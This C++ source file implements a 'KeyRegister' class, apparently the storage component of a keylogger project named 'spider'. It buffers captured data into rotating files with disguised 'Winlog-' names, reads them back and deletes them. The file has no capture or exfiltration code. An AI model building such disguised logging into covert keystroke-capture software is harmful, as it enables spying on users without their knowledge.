#include <stdlib.h>
#include <time.h>
#include <iostream>
#include <string>

#include "keyRegister/keyRegister.hpp"

namespace spider
{
	KeyRegister::KeyRegister(size_t fileMaxSize)
		: _currentFileSize(0), _fileMaxSize(fileMaxSize)
	{
		_writeMode = true;
		srand (time(NULL));
		openWriteableFile();
	}

	KeyRegister::~KeyRegister()
	{}

	void KeyRegister::write(char *msg, int length)
	{
		if (!_currentFile.is_open()) {
			//std::cout << "closed file" << std::endl;
			return ;
		}
		if (_currentFileSize + length >= _fileMaxSize)
		{
			_currentFile.close();
			openWriteableFile();
		}
		_currentFile.write(msg, length);
		_currentFileSize += length;
	}

	int KeyRegister::read(char *&messages)
	{
		int size = 0;

		if (!_currentFile.is_open()) {
			//std::cout << "not any file t oread open" << std::endl;
			return (size);
		}
		_currentFile.seekg (0, _currentFile.end);
		size = _currentFile.tellg();
		_currentFile.seekg (0, _currentFile.beg);
		messages = new char[size];
		_currentFile.read(messages, size);
		if (!_currentFile)
		{
			std::cout << "read error" << std::endl;
			delete[] messages;
			messages = NULL;
			size = 0;
		}
		_currentFile.close();
		std::remove(_file.front().c_str());
		_file.pop_front();
		openReadableFile();
		return size;
	}

	void KeyRegister::swapMode()
	{
		std::cout << "swapping key register to";  
		if (_writeMode)
		{
			std::cout << " read mode" << std::endl;
			_writeMode = false;
			_currentFile.close();
			openReadableFile();
		}
		else
		{
			std::cout << " write mode" << std::endl;
			_writeMode = true;
			_currentFile.close();
			openWriteableFile();
		}
	}

	void KeyRegister::openReadableFile()
	{
		if (!_file.empty())
		{
			_currentFile.open(_file.front(), std::fstream::in | std::fstream::binary);
		}
	}

	void KeyRegister::openWriteableFile()
	{
		std::string file("Winlog-");
		getRandomAscii(file);	
		std::cout << "openfile : " << file << std::endl;
		_currentFile.open(file, std::fstream::out | std::ifstream::binary);
		_currentFileSize = 0;
		_file.push_back(file);
	}

	void KeyRegister::getRandomAscii(std::string &filename)
	{
		for (int i = 0; i < 10; ++i)
		{
			char c[2];
			c[1] = 0;
			c[0] = rand() %90 + 32;
			filename += std::string(c);
		}
		return ;
	}
}